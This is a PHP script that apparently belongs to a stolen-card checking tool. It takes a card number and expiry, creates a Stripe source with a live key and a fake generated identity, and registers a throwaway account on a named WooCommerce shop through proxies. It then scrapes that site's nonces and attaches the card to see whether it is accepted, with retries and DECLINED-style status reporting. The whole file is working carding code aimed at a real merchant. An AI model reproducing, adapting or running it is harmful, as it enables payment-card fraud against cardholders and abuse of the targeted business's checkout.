<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$data = 'type=card&owner[name]='.$fake->first.'+'.$fake->last.'&owner[email]='.urlencode($fake->email).'&card[number]='.$cc.'&card[cvc]=000&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F80b922db8%3B+stripe-js-v3%2F80b922db8&time_on_page='.rand(50000, 100000).'&key=pk_live_sUOQOMUEWnOOCMoPmDsjCTep';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/sources', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$src = $json_r1->id;

$r2 = $this->curlx->Get('https://stillorgandecor.ie/my-account/add-payment-method/', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$nonce_v1 = trim(strip_tags($this->getstr($r2->body, 'woocommerce-register-nonce" value="', '"')));

if (empty($nonce_v1)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'billing_first_name='.$fake->first.'&billing_last_name='.$fake->last.'&email='.urlencode($fake->email).'&password=jhondoe&terms=on&terms-field=1&woocommerce-register-nonce='.$nonce_v1.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register';

$r3 = $this->curlx->Post('https://stillorgandecor.ie/my-account/add-payment-method/', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$nonce_v2 = trim(strip_tags($this->getstr($r3->body, '"add_card_nonce":"', '"')));

if (empty($nonce_v2)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = 'stripe_source_id='.$src.'&nonce='.$nonce_v2;

$r4 = $this->curlx->Post('https://stillorgandecor.ie/?wc-ajax=wc_stripe_create_setup_intent', $data, null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$json_r4 = json_decode($r4->body);

if (isset($json_r4->error)) {
	$status = $this->response->ErrorHandler($json_r4->error);

	goto end;
}

file_put_contents('strh_r4_no_err.txt', $r4->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r4->body);

end: